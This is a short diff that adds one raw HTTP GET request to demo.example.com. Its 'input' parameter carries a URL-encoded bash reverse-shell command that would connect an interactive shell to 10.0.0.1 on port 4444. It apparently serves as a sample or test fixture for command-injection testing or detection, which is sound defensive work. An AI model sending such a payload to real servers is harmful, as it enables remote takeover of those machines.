@@ -1,0 +1,4 @@
+GET /a?input=bash%20-i%20\u003E\u0026%20/dev/tcp/10.0.0.1/4444%200\u003E\u00261 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
